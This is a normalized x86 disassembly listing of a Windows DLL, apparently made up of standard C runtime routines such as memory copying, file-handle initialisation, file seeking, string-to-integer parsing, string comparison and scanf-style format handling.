jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10013e28 ]
jmp [ ecx * 4 + jump_table_10013ea8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10013f14 ]
pop esi
pop edi
pop ebp
jmp sub_1001a1c2
jmp [ ecx * 4 + jump_table_100140b0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10013fb4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100140b0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10013f14 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_100140b0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10013f14 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10013f14 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10013f14 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100140b0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100140b0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100140b0 ]
sub_10014105
push 0x54
push r--data
call sub_10011e54
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_100159c7
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_100159c7
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_10011e99
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10017666
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10017666
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_10014359
mov edi edi
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
lea eax [ edi + 0x800 ]
jmp r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
pop esi
retn
cmp edi eax
jb r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push [ esi ]
call sub_1000c3e9
and [ esi ] 0x0
pop ecx
mov eax [ esi ]
add edi 0x40
add eax 0x800
lea eax [ edi + 0xc ]
push eax
call [ DeleteCriticalSection@IAT ]
sub_100143a7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_10019872
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_1001034f
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_10010375
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_1001441c
push 0x10
push r--data
call sub_10011e54
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_10010362
and [ eax ] 0x0
call sub_1001034f
mov [ eax ] 0x9
call sub_10010362
mov [ eax ] edi
call sub_1001034f
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_100102e7
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10011e99
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_100198e9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1001034f
mov [ eax ] 0x9
call sub_10010362
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100143a7
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100144ee
mov eax [ ebp - 0x1c ]
sub_100144f8
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_1000c185
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_1001034f
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_1001840b
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_1001034f
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_10014727
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_100144f8
add esp 0x14
pop ebp
retn
sub_10014760
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_10014800
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_10014870
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_100148fb
mov edi edi
push ebp
mov ebp esp
mov eax [ esi ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ edi ]
push 0x2
push eax
cmp ecx [ ebp + 0xc ]
jne r-xdata
push ecx
call sub_10015a61
add esp 0xc
test eax eax
je r-xdata
call sub_100159c7
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
push [ esi ]
push [ ebp + 0xc ]
push [ edi ]
call sub_10013da0
add esp 0xc
jmp r-xdata
shl [ esi ] 0x1
sub_10014952
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_1001a335
test eax eax
movsx eax [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop ebp
retn
and eax 0xffffffdf
sub eax 0x7
sub_1001499b
mov edi edi
push ebp
mov ebp esp
push ebx
mov eax ebx
pop ebx
pop ebp
retn
movzx eax bl
push eax
call sub_1001a43a
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
inc [ esi ]
call sub_10014972
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub_100149c5
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x1e4 ] ecx
lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x19c ] eax
mov [ ebp - 0x1ac ] ecx
mov [ ebp - 0x1dc ] 0x15e
mov [ ebp - 0x1d0 ] esi
mov [ ebp - 0x1e8 ] esi
mov [ ebp - 0x188 ] esi
cmp edi esi
jne r-xdata
cmp eax esi
je r-xdata
call sub_1001034f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
push ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1000c176
leave
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x1f8 ]
call sub_1000c185
mov al [ edi ]
mov [ ebp - 0x19d ] 0x0
mov [ ebp - 0x18c ] esi
mov [ ebp - 0x1c4 ] esi
test al al
je r-xdata
push eax
call sub_10012f31
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x1ec ] 0x0
je r-xdata
mov esi [ ebp - 0x19c ]
movzx eax al
push eax
call sub_1001a43a
pop ecx
test eax eax
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0x1c4 ]
mov eax [ ebp - 0x1f0 ]
and [ eax + 0x70 ] 0xfffffffd
mov al [ edi ]
cmp al 0x25
jne r-xdata
dec [ ebp - 0x18c ]
push esi
push esi
lea esi [ ebp - 0x18c ]
call sub_1001499b
pop ecx
push eax
call sub_10014988
pop ecx
pop ecx
call sub_1001034f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
inc [ ebp - 0x18c ]
mov edx esi
call sub_10014972
mov ebx eax
movzx eax [ edi ]
inc edi
mov [ ebp - 0x188 ] ebx
mov [ ebp - 0x1b8 ] edi
cmp eax ebx
jne r-xdata
cmp [ edi + 0x1 ] al
je r-xdata
inc edi
movzx eax [ edi ]
push eax
call sub_1001a43a
pop ecx
test eax eax
jne r-xdata
jmp r-xdata
pop ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
push esi
push ebx
jmp r-xdata
movzx eax bl
push eax
call sub_100183f8
pop ecx
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
xor esi esi
mov [ ebp - 0x1c0 ] esi
mov [ ebp - 0x1d1 ] 0x0
mov [ ebp - 0x1a8 ] esi
mov [ ebp - 0x1b4 ] esi
mov [ ebp - 0x194 ] esi
mov [ ebp - 0x19f ] 0x0
mov [ ebp - 0x1a0 ] 0x0
mov [ ebp - 0x196 ] 0x0
mov [ ebp - 0x1ad ] 0x0
mov [ ebp - 0x19e ] 0x0
mov [ ebp - 0x18d ] 0x0
mov [ ebp - 0x195 ] 0x1
mov [ ebp - 0x1d8 ] esi
mov al [ edi ]
test al al
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
call sub_10014988
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x188 ] 0xffffffff
jne r-xdata
inc [ ebp - 0x18c ]
mov edx esi
call sub_10014972
movzx ecx [ edi ]
inc edi
mov [ ebp - 0x1b8 ] edi
cmp ecx eax
jne r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x25
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0x194 ]
inc [ ebp - 0x1b4 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x194 ] eax
jmp r-xdata
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
cmp [ ebp - 0x1d0 ] 0x1
jne r-xdata
cmp [ edi ] 0x25
jne r-xdata
push esi
push eax
call sub_10014988
push esi
push ebx
call sub_10014988
add esp 0x10
dec [ ebp - 0x18c ]
mov edi eax
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x1ad ] 0x0
je r-xdata
cmp [ ebp - 0x188 ] 0xffffffff
jne r-xdata
push [ ebp - 0x1ac ]
call sub_1000c3e9
pop ecx
mov eax [ ebp - 0x1b8 ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
dec [ ebp - 0x195 ]
dec [ ebp - 0x18d ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc edi
movzx ebx [ edi ]
movzx eax bl
push eax
call sub_1001a335
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x196 ] 0x0
mov [ ebp - 0x1b8 ] edi
jne r-xdata
mov eax [ ebp - 0x1c4 ]
test eax eax
jne r-xdata
mov edi eax
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x196 ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
xor esi esi
mov eax [ ebp - 0x1e4 ]
mov esi [ eax ]
mov [ ebp - 0x1fc ] eax
add eax 0x4
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
cmp [ ebp - 0x1ec ] 0x0
je r-xdata
cmp [ ebp - 0x19d ] al
jne r-xdata
inc [ ebp - 0x1d8 ]
mov edi eax
mov [ ebp - 0x1cc ] esi
mov [ ebp - 0x1c8 ] esi
jmp r-xdata
inc [ ebp - 0x195 ]
inc [ ebp - 0x18d ]
jmp r-xdata
inc [ ebp - 0x1ad ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx eax [ edi ]
or eax 0x20
mov [ ebp - 0x1a4 ] eax
cmp eax 0x6e
je r-xdata
mov al [ edi ]
cmp al 0x53
je r-xdata
xor bl bl
mov [ ebp - 0x1bc ] esi
cmp [ ebp - 0x18d ] bl
jne r-xdata
mov ecx [ ebp - 0x1f0 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
mov cl [ edi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x1b4 ]
test ecx ecx
je r-xdata
cmp eax 0x63
je r-xdata
mov [ ebp - 0x18d ] 0x1
mov [ ebp - 0x18d ] 0xff
cmp al 0x43
jne r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x195 ]
jmp r-xdata
mov eax [ ebp - 0x1a4 ]
cmp eax 0x6f
jg r-xdata
cmp [ ebp - 0x194 ] 0x0
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_10014972
cmp eax 0x7b
je r-xdata
cmp cl 0x64
je r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
sub eax 0x70
je r-xdata
je r-xdata
push [ ebp - 0x19c ]
push [ ebp - 0x188 ]
mov esi [ ebp - 0x1bc ]
mov edi [ ebp - 0x1b8 ]
push [ ebp - 0x19c ]
lea esi [ ebp - 0x18c ]
call sub_1001499b
pop ecx
jmp r-xdata
cmp cl 0x69
je r-xdata
mov edi eax
jmp r-xdata
mov [ ebp - 0x195 ] 0x1
sub eax 0x3
je r-xdata
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
cmp eax 0x63
je r-xdata
mov [ ebp - 0x188 ] eax
cmp eax 0xffffffff
je r-xdata
cmp cl 0x6f
je r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov [ ebp - 0x1a0 ] 0x1
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
push 0x64
pop edx
cmp eax edx
je r-xdata
cmp cl 0x78
je r-xdata
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
mov edi [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push edi
push [ ebp - 0x188 ]
mov [ ebp - 0x1c0 ] esi
call sub_10014988
pop ecx
pop ecx
mov [ ebp - 0x19e ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x194 ]
mov [ ebp - 0x1b4 ] 0x1
jle r-xdata
cmp cl 0x58
jne r-xdata
mov edi [ ebp - 0x1c0 ]
test bl bl
